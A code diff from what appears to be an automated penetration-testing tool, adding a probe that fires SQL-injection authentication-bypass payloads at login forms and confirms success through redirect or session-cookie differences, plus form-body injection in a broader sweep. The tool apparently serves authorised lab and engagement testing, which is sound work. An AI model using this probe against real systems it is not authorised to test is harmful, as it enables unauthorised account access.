@@ -23,6 +23,8 @@ import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, detectDebugSignature, rende
 import { readArtifactRecords, deriveTargets, setAtPath, jsonStringLeafPaths, type SweepTargetWithBody } from "./sweep-targets.js";
 import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, parseAesCbcParams, decodePhpSerialized, swapLastPhpSerializedString, type FieldMap } from "./stateful.js";
 import { discoverVhosts, collectDnsNames, baseDomainOf, type VhostExec } from "./dns-recon.js";
+import { setFormParam, authBypassMarker, LOGIN_BYPASS_PAYLOADS } from "./sweep-forms.js";
+import { classifyField } from "./stateful.js";
 import { Resolver } from "node:dns/promises";
 import { connect as netConnect } from "node:net";
 import { appendFile } from "node:fs/promises";
@@ -313,6 +315,49 @@ async function runDnsRecon(opts: {
 }
 
 /**
+ * LOGIN SQLi AUTH-BYPASS probe (HTB-Cronos class): for a login-like target (a username-ish +
+ * password-ish param, form OR json), send a benign wrong login (control) and an SQLi-bypass
+ * payload in the username with a wrong password (exploit). If the exploit yields an
+ * AUTH-SUCCESS signal the control lacks (a 3xx to a post-login page, or a fresh session
+ * cookie), bank auth_bypass via the Axiom body_contains differential. Black-box: generic
+ * payloads + control differential; the marker is the app's OWN redirect/cookie, not a literal.
+ */
+async function sweepLoginBypass(
+  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
+  targets: SweepTargetWithBody[],
+  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null, authToken?: string) => Promise<HttpCapture | null>,
+): Promise<ProvedEntry[]> {
+  const proved: ProvedEntry[] = [];
+  for (const t of targets) {
+    if (!t.bodyTemplate) continue;
+    const url = t.endpoint.toLowerCase();
+    if (/(logout|signout|change|reset|forgot|signup|register|otp)/.test(url)) continue; // login endpoints only
+    const roleOf = (p: string) => classifyField(p.split(".").pop() || p);
+    const userP = t.params.find((p) => roleOf(p) === "username");
+    const passP = t.params.find((p) => roleOf(p) === "password");
+    if (!userP || !passP) continue;
+    const isForm = t.paramKind[userP] === "form";
+    const hdr = { "Content-Type": isForm ? "application/x-www-form-urlencoded" : "application/json" };
+    const setP = (body: string, param: string, val: string): string => {
+      if (t.paramKind[param] === "form") return setFormParam(body, param, val);
+      try { return JSON.stringify(setAtPath(JSON.parse(body), param, val)); } catch { return body; }
+    };
+    const wrongPw = `Sahw${randomUUID().slice(0, 6)}z9`;
+    const control = await fire(t.method, t.endpoint, hdr, setP(setP(t.bodyTemplate, userP, `sahwnobody${randomUUID().slice(0, 6)}`), passP, wrongPw), null);
+    if (!control) continue;
+    for (const payload of LOGIN_BYPASS_PAYLOADS) {
+      const exploit = await fire(t.method, t.endpoint, hdr, setP(setP(t.bodyTemplate, userP, payload), passP, wrongPw), null);
+      if (!exploit) continue;
+      const marker = authBypassMarker(control.response, exploit.response);
+      if (!marker) continue;
+      const banked = await bankIfConfirmed(opts, "auth_bypass", t.endpoint, marker, exploit, control);
+      if (banked) { proved.push(banked); break; }
+    }
+  }
+  return proved;
+}
+
+/**
  * Result of the sweep: the hunter directive (leads) AND the findings it banked DIRECTLY
  * through the Axiom (so a hit is recorded even if the LLM ignores the directive — the
  * deterministic discover→verdict path, not a reliance on the model to submit).
@@ -346,6 +391,9 @@ async function runDeepSweep(opts: {
         try { body = JSON.stringify(setAtPath(JSON.parse(t.bodyTemplate), param, v)); }
         catch { body = t.bodyTemplate; }
         if (!headers["Content-Type"] && !headers["content-type"]) headers["Content-Type"] = "application/json";
+      } else if (t.paramKind[param] === "form" && t.bodyTemplate) {
+        body = setFormParam(t.bodyTemplate, param, v);
+        if (!headers["Content-Type"] && !headers["content-type"]) headers["Content-Type"] = "application/x-www-form-urlencoded";
       } else {
         try { const u = new URL(t.endpoint); u.searchParams.set(param, v); url = u.toString(); } catch { /* keep */ }
       }
@@ -517,6 +565,11 @@ async function runDeepSweep(opts: {
     // Bounded + reversible (compensating positive transfer); recovers the OTP key generically.
     const txProved = await sweepNegativeTransfer(opts, fire, records as RawRecord[], opts.scopeOrigins);
     proved.push(...txProved);
+
+    // LOGIN SQLi AUTH-BYPASS (redirect/cookie differential) — catches the Cronos-class login
+    // bypass a body_contains/DB-error oracle misses.
+    const loginProved = await sweepLoginBypass(opts, targets, fire);
+    proved.push(...loginProved);
 
     const fieldHits = await runSweep({ targets, payloadsFor: (c) => SWEEP_PAYLOADS[c] ?? [], send, budget: opts.budget });
 
